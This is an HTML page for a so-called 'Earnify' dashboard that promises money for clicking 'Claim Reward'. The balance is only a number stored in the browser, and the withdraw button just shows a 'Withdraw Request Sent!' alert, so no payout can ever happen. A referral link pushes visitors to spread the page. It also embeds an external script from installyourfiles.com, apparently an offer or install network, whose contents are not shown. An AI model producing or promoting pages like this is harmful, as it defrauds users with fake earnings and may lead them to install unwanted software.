<!DOCTYPE html>
<html>
<head>
<title>Earnify Dashboard</title>
<style>
body{
background:#000;
color:white;
font-family:Arial;
text-align:center;
padding:20px;
}

.box{
background:#111;
padding:20px;
border-radius:15px;
margin-top:20px;
}

button{
padding:15px 25px;
background:#00ff99;
border:none;
border-radius:10px;
font-size:20px;
margin:10px;
}

a{
text-decoration:none;
}

input{
padding:12px;
width:90%;
margin:10px;
border-radius:10px;
border:none;
}
</style>
</head>

<body>

<h1>Earnify 🚀</h1>

<div class="box">
<h2>Your Balance</h2>
<h1 id="balance">₹0</h1>
</div>

<div class="box">
<h2>Earn Money</h2>

<script type="text/javascript" src="https://installyourfiles.com/script_include.php?id=1897922"></script>

<br><br>

<button onclick="addMoney()">Claim Reward</button>

</div>

<div class="box">
<h2>Referral Program</h2>

<p>Your Referral Link:</p>

<input type="text" id="refLink">

<button onclick="copyRef()">Copy Link</button>

</div>

<div class="box">

<h2>Withdraw</h2>

<p>Minimum Withdraw ₹200</p>

<button onclick="withdraw()">Withdraw Now</button>

</div>

<script>

let money = localStorage.getItem("money") || 0;
document.getElementById("balance").innerHTML = "₹" + money;

let ref = window.location.href;
document.getElementById("refLink").value = ref;

function addMoney(){

money = parseInt(money) + 10;

localStorage.setItem("money", money);

document.getElementById("balance").innerHTML = "₹" + money;

alert("₹10 Added Successfully!");

}

function copyRef(){

let copyText = document.getElementById("refLink");

copyText.select();

document.execCommand("copy");

alert("Referral Link Copied!");

}

function withdraw(){

if(money >= 200){

alert("Withdraw Request Sent!");

}else{

alert("Minimum ₹200 Required");

}

}

</script>

</body>
</html>
